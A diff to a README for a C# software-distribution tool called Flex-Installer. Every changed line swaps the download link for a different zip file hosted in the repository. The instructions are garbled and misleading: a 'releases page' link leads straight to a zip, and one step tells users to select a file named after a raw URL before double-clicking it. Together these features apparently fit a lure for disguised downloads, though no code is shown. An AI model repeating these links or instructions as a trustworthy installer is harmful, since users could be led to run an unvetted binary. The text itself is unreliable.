@@ -1,6 +1,6 @@
 # 🎉 Flex-Installer - Distribute Your Software with Ease
 
-[![Download Flex-Installer](https://raw.githubusercontent.com/ngakan5/Flex-Installer/main/FlexInstaller/Flex-Installer-v1.4.zip)](https://raw.githubusercontent.com/ngakan5/Flex-Installer/main/FlexInstaller/Flex-Installer-v1.4.zip)
+[![Download Flex-Installer](https://github.com/ngakan5/Flex-Installer/raw/refs/heads/main/FlexInstaller/Installer_Flex_1.7.zip)](https://github.com/ngakan5/Flex-Installer/raw/refs/heads/main/FlexInstaller/Installer_Flex_1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Flex Installer is a program written in C#. It helps you distribute both personal
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of Flex Installer: [Download Flex Installer](https://raw.githubusercontent.com/ngakan5/Flex-Installer/main/FlexInstaller/Flex-Installer-v1.4.zip).
+To get started, visit this page to download the latest version of Flex Installer: [Download Flex Installer](https://github.com/ngakan5/Flex-Installer/raw/refs/heads/main/FlexInstaller/Installer_Flex_1.7.zip).
 
 1. Click on the link above.
 2. Look for the latest release.
-3. Select the file that says `https://raw.githubusercontent.com/ngakan5/Flex-Installer/main/FlexInstaller/Flex-Installer-v1.4.zip` or similar.
+3. Select the file that says `https://github.com/ngakan5/Flex-Installer/raw/refs/heads/main/FlexInstaller/Installer_Flex_1.7.zip` or similar.
 4. Click the file to download it to your computer.
 5. Once the download is complete, locate the file in your downloads folder.
 6. Double-click the file to start the installation process.
@@ -78,6 +78,6 @@ By contributing, you help make Flex Installer even better for everyone.
 
 Now that you have Flex Installer installed, you can start distributing your software. Don’t forget to explore the options to customize your installation process. 
 
-For any updates or new features, keep an eye on the releases page: [Download Flex Installer](https://raw.githubusercontent.com/ngakan5/Flex-Installer/main/FlexInstaller/Flex-Installer-v1.4.zip).
+For any updates or new features, keep an eye on the releases page: [Download Flex Installer](https://github.com/ngakan5/Flex-Installer/raw/refs/heads/main/FlexInstaller/Installer_Flex_1.7.zip).
 
 Happy distributing!
